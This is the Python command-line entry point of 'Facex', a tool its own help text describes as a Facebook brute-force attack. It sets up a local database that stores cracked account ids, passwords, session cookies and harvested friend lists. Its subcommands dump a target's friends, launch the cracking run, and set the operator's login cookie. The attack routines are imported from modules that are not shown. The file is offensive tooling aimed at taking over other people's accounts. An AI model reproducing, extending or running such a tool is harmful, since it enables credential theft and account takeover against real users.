#!/usr/bin/env python3
import argparse, os, sys, sqlite3
from .sct import Token

DB_DIR = os.path.expanduser('~/.facex')
DB_NAME = os.path.join(DB_DIR, 'database.db')

if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR)

def main():
    from . import Facebook
    with sqlite3.connect(DB_NAME) as db:
        cursor = db.cursor()
        cursor.execute('CREATE TABLE IF NOT EXISTS cache (id TEXT UNIQUE)')
        cursor.execute('CREATE TABLE IF NOT EXISTS checkpoint (id TEXT UNIQUE NOT NULL, password TEXT, cookie TEXT, useragents TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS success (id TEXT UNIQUE NOT NULL, password TEXT, cookie TEXT, useragents TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS dump (id TEXT UNIQUE NOT NULL, name TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS user (cookie TEXT, token TEXT)')
        cursor.execute('CREATE TABLE IF NOT EXISTS useragents (ua TEXT)')
        db.commit()

    parser = argparse.ArgumentParser(prog='Facex', description='Facebook bruteforce attack using python cli.', epilog='Nyett')
    action = parser.add_subparsers(title='action', dest='action', required=True)

    dump = action.add_parser('dump')
    dump.add_argument('-t', '--target', help='Facebook id for get list friends.')

    run = action.add_parser('run')
    set = action.add_parser('set')
    set.add_argument('-c', '--cookie', help='Login.')
    set.add_argument('-ua', '--useragents', help='Add new useragents.')

    pars = parser.parse_args()
    match pars.action:
        case 'set':
            if pars.cookie:
                Token(cookie=pars.cookie).adsmanager()

            elif pars.useragents:
                with sqlite3.connect(DB_NAME) as db:
                    c__ = db.cursor()
                    c__.execute('DELETE FROM useragents')
                    c__.execute('INSERT INTO useragents (ua) VALUES (?)', (pars.useragents, ))
                    db.commit()

                    c__.execute('SELECT * FROM useragents')
                    d__ua_ = c__.fetchall()


                    print('[ INFO! ] Successfull add new Useragents.')
                    print(f'[ INFO! ] Total {len(d__ua_)} Useragents.')

        case 'dump':
            Facebook().dump_friendlist(id=pars.target)

        case 'run':
            Facebook().crack()



if __name__ == "__main__":
    main()
